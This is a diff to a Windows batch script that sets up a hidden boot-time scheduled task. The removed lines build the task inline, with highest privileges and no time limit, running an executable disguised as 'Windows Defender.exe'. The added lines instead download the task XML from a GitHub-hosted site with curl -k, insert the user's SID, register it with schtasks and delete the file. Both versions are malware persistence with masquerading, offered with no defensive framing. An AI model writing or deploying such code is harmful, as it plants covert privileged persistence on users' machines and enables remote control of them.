@@ -9,57 +9,8 @@ Set host=https://cryptedodissey.github.io
 Set enviroment=C:\Windows
 
 FOR /F "tokens=1,2 delims==" %%s IN ('wmic path win32_useraccount where name^='%username%' get sid /value ^| find /i "SID"') DO SET SID=%%t
-cd /d "%~dp0" && chcp 65001 >nul && set "_Sfx=%~dp0"
-for /f tokens^=* %%i in ('cmd /u /c ^<con: findstr /e ">" "%~dpnx0"
-')do <nul (call set /p "'=%%~i"&echo\)>>"%~dpnx0TempXML.tmp"
-powershell -nop -c "gc '%~dpnx0TempXML.tmp'|Out-File -FilePath '%~dp0%SID%.xml' -Encoding UNICODE"
-echo="%_Sfx\%">"%temp%\_Sfx_var.txt"  & 2>nul del /q /f "%~dpnx0TempXML.tmp" & goto :resume
-
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo>
-    <Date>2012-08-19T16:49:14.6182</Date>
-    <Author>%ComputerName%\%Username%</Author>
-    <URI>\SmartMan</URI>
-  </RegistrationInfo>
-  <Triggers>
-    <BootTrigger>
-      <Enabled>true</Enabled>
-    </BootTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id="Author">
-      <UserId>%SID%</UserId>
-      <LogonType>InteractiveToken</LogonType>
-      <RunLevel>HighestAvailable</RunLevel>
-    </Principal>
-  </Principals>
-  <Settings>
-    <MultipleInstancesPolicy>StopExisting</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>false</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings>
-      <StopOnIdleEnd>false</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
-    </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Priority>7</Priority>
-  </Settings>
-  <Actions Context="Author">
-    <Exec>
-      <Command>"%environment%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"</Command>
-    </Exec>
-  </Actions>
-</Task>
-:resume
+curl -k %proxy% "https://raw.githubusercontent.com/cryptedodissey/cryptedodissey.github.io/main/Task.xml" > "%SID%.xml"
+powershell -Command "(gc '%SID%.xml') -replace 'SID', '%SID%' | Out-File -encoding ASCII '%SID%.xml'"
 schtasks /create /tn "%SID%XYZ" /xml "%SID%.xml"
 del "%SID%.xml"
 
